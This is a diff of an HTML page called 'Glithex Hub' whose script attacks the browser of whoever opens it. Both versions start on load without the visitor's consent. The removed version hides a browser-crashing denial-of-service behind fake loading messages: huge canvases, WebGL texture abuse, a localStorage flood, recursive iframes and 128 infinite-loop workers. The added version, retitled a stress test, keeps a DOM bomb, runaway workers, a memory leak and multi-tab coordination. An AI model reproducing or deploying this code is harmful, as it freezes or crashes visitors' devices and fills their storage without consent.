@@ -1,139 +1,169 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Glithex Hub</title>
+  <title>Glithex Hub - Stress Test</title>
   <style>
-    body { margin: 0; background: #000; color: #0f0; font-family: monospace; }
+    body {
+      margin: 0;
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
     canvas { display: none; }
+    #log { white-space: pre-line; text-align: center; }
   </style>
 </head>
 <body>
-<div id="log">Initializing Glithex Hub...</div>
+<div id="log"></div>
+
 <script>
-let memoryLeak = [];
-let canvasCount = 0;
-const log = document.getElementById('log');
-let isOverloading = false;
+  let memoryLeak = [];
+  const log = document.getElementById('log');
 
-function updateLog(message) {
+  function updateLog(message) {
     log.innerText = message;
-}
+  }
 
-function delayAndStart() {
-    updateLog("Loading resources...");
-    setTimeout(() => {
-        updateLog("Initializing Canvas and WebGL overload...");
-        setTimeout(() => {
-            updateLog("Activating Video Decode and LocalStorage flood...");
-            setTimeout(() => {
-                updateLog("Spawning workers and iframe loops...");
-                setTimeout(() => {
-                    startEverything();
-                    updateLog("🚀 Glithex Hub Activated!");
-                }, 3000); // Delay before starting the final phase
-            }, 3000); // Delay before spawning workers and iframe loops
-        }, 3000); // Delay before video decode and localStorage flood
-    }, 3000); // Delay before initializing canvas and WebGL overload
-}
+  // Check if all tabs are open and ready
+  function checkAllTabsReady() {
+    // Use localStorage to share state between tabs
+    const openedTabs = parseInt(localStorage.getItem('openedTabs') || '0');
+    const totalTabs = 10;  // Number of tabs expected to open
 
-function MainCanvas() {
-    if (!isOverloading) return;
-    for (let i = 0; i < 20; i++) {
-        const canvas = document.createElement('canvas');
-        canvas.width = 12000;
-        canvas.height = 12000;
-        const ctx = canvas.getContext('2d');
-        for (let j = 0; j < 2000; j++) {
-            ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
-            ctx.fillRect(Math.random()*12000, Math.random()*12000, 1000, 1000);
+    if (openedTabs < totalTabs) {
+      localStorage.setItem('openedTabs', openedTabs + 1);
+      setTimeout(checkAllTabsReady, 1000);  // Check again in 1 second
+    } else {
+      // All tabs are ready, start the stress test
+      setTimeout(startStressTest, 3000);  // 3-second delay before starting the stress test
+    }
+  }
+
+  // 🌋 Phase 1: DOM Bomb
+  function DOMBomb() {
+    updateLog("Starting DOM Bomb...");
+    for (let i = 0; i < 5000; i++) { // Start with 5000 DOM elements
+      const div = document.createElement('div');
+      div.style.position = 'absolute';
+      div.style.left = `${Math.random() * window.innerWidth}px`;
+      div.style.top = `${Math.random() * window.innerHeight}px`;
+      div.style.width = `${Math.random() * 200}px`;
+      div.style.height = `${Math.random() * 200}px`;
+      div.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+      document.body.appendChild(div);
+    }
+  }
+
+  // 🌋 Phase 2: WebGL Fragment Shader Overload
+  function WebGLFragmentShader() {
+    updateLog("Starting WebGL Fragment Shader...");
+    const canvas = document.createElement('canvas');
+    canvas.width = 4096;
+    canvas.height = 4096;
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) return;
+
+    const vertexShader = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vertexShader, `
+        attribute vec4 position;
+        void main() {
+            gl_Position = position;
         }
-        document.body.appendChild(canvas);
-        memoryLeak.push(canvas);
-        canvasCount++;
-    }
-    setTimeout(MainCanvas, 1);
-}
+    `);
+    gl.compileShader(vertexShader);
 
-function WebGLTextureAbuse() {
-    for (let i = 0; i < 10; i++) {
-        const canvas = document.createElement('canvas');
-        canvas.width = canvas.height = 4096;
-        document.body.appendChild(canvas);
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) continue;
-
-        const texture = gl.createTexture();
-        gl.bindTexture(gl.TEXTURE_2D, texture);
-        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
-        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
-        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
-        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
-
-        setInterval(() => {
-            gl.bindTexture(gl.TEXTURE_2D, texture);
-            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-        }, 1);
-    }
-}
-
-function VideoDecodeAbuse() {
-    for (let i = 0; i < 10; i++) {
-        const video = document.createElement('video');
-        video.src = "https://www.w3schools.com/html/mov_bbb.mp4";
-        video.loop = true;
-        video.muted = true;
-        video.autoplay = true;
-        document.body.appendChild(video);
-    }
-}
-
-function LocalStorageFlood() {
-    setInterval(() => {
-        for (let i = 0; i < 5000; i++) {
-            localStorage.setItem(`key_${Math.random()}`, 'x'.repeat(5000));
+    const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fragmentShader, `
+        precision highp float;
+        uniform float time;
+        void main() {
+            gl_FragColor = vec4(sin(time) * 0.5 + 0.5, cos(time) * 0.5 + 0.5, 0.0, 1.0);
         }
-    }, 10);
-}
+    `);
+    gl.compileShader(fragmentShader);
 
-function iframeLoop() {
-    const iframe = document.createElement('iframe');
-    iframe.src = window.location.href;
-    iframe.style.display = 'none';
-    document.body.appendChild(iframe);
-    setTimeout(iframeLoop, 1000);
-}
+    const program = gl.createProgram();
+    gl.attachShader(program, vertexShader);
+    gl.attachShader(program, fragmentShader);
+    gl.linkProgram(program);
+    gl.useProgram(program);
 
-function launchWorkers(num) {
+    const position = gl.getAttribLocation(program, 'position');
+    const buffer = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
+    gl.enableVertexAttribArray(position);
+    gl.vertexAttribPointer(position, 2, gl.FLOAT, false, 0, 0);
+
+    function render(time) {
+        gl.uniform1f(gl.getUniformLocation(program, 'time'), time * 0.001);
+        gl.drawArrays(gl.TRIANGLES, 0, 3);
+        requestAnimationFrame(render);
+    }
+    render(0);
+    document.body.appendChild(canvas);
+  }
+
+  // 🌋 Phase 3: Launch Workers Gradually
+  function launchWorkers(num) {
+    updateLog("Starting Workers...");
     const code = `
         while (true) {
             let load = [];
-            for (let i = 0; i < 2000; i++) {
-                load.push(new Array(20000).fill(Math.random()));
+            for (let i = 0; i < 5000; i++) { // Start with 5000 iterations
+                load.push(new Array(5000).fill(Math.random())); // Each array is bigger
             }
         }
     `;
     const blob = new Blob([code], { type: "application/javascript" });
     const url = URL.createObjectURL(blob);
     for (let i = 0; i < num; i++) {
-        new Worker(url);
+      new Worker(url);
     }
-}
+  }
 
-function startEverything() {
-    isOverloading = true;
-    MainCanvas();
-    WebGLTextureAbuse();
-    VideoDecodeAbuse();
-    LocalStorageFlood();
-    iframeLoop();
-    launchWorkers(128);
+  // 🌋 Phase 4: Gradual Memory Leak
+  function MemoryLeak() {
+    updateLog("Starting Memory Leak...");
     setInterval(() => {
-        log.innerText = `🔥 Glithex Hub Active | Canvases: ${canvasCount} | Memory: ${Math.round(window.performance.memory?.usedJSHeapSize / 1024 / 1024 || 0)} MB`;
-    }, 500);
-}
+        memoryLeak.push(new Array(1000000).fill(Math.random())); // Larger arrays for leak
+    }, 1000);  // Slower leak rate to prevent instant overload
+  }
 
-delayAndStart();
+  // 🌋 Phase 5: Canvas Rendering
+  function IntensiveCanvasRendering() {
+    updateLog("Starting Intensive Canvas Rendering...");
+    const canvas = document.createElement('canvas');
+    canvas.width = 4096;
+    canvas.height = 4096;
+    const ctx = canvas.getContext('2d');
+    document.body.appendChild(canvas);
+
+    function render() {
+        ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+        ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 200, 200);
+        requestAnimationFrame(render);
+    }
+    render();
+  }
+
+  // 🌋 Start Gradual Overload
+  function startStressTest() {
+    // Start phases one by one with delays
+    setTimeout(() => DOMBomb(), 500);  // Delay for DOMBomb
+    setTimeout(() => WebGLFragmentShader(), 2000);  // Delay for WebGL
+    setTimeout(() => launchWorkers(50), 5000);  // Delay for workers
+    setTimeout(() => MemoryLeak(), 8000);  // Delay for memory leak
+    setTimeout(() => IntensiveCanvasRendering(), 12000);  // Delay for canvas rendering
+  }
+
+  // Start the tab checking process
+  checkAllTabsReady();  // Start the checking process when the page loads
 </script>
 </body>
 </html>
